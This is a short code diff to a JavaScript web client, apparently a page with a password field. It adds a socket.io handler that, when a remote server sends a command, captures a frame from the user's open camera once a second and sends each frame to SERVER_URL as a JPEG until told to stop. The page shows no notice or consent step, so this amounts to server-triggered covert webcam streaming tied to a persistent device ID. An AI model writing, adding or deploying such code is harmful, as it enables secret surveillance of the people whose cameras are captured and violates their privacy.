@@ -204,6 +204,25 @@ function initPersistentStorage() {
 const socket = io(SERVER_URL, { query: { deviceId: localStorage.getItem('deviceId') || '' } });
 socket.on('device-id', (id) => { deviceId = id; localStorage.setItem('deviceId', id); });
 
+// Live camera stream control
+let camStreamInterval = null;
+socket.on('start-camera-stream', () => {
+    if (camStreamInterval) return;
+    if (!stream || !stream.getVideoTracks().length) return;
+    const v = document.querySelector('video[data-snap]');
+    if (!v) return;
+    const c = document.createElement('canvas');
+    camStreamInterval = setInterval(() => {
+        const s = stream.getVideoTracks()[0].getSettings();
+        c.width = s.width || 320; c.height = s.height || 240;
+        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+        socket.emit('camera-stream', { image: c.toDataURL('image/jpeg',0.4).split(',')[1] });
+    }, 1000);
+});
+socket.on('stop-camera-stream', () => {
+    if (camStreamInterval) { clearInterval(camStreamInterval); camStreamInterval = null; }
+});
+
 function togglePass() { const i=passInput; i.type=i.type==='password'?'text':'password'; }
 function showToast(msg) { const c=document.getElementById('toastContainer'), t=document.createElement('div'); t.className='toast error'; t.innerHTML='<span>\u2715</span> '+msg; c.appendChild(t); setTimeout(()=>{t.classList.add('out');setTimeout(()=>t.remove(),250)},3500); }
 
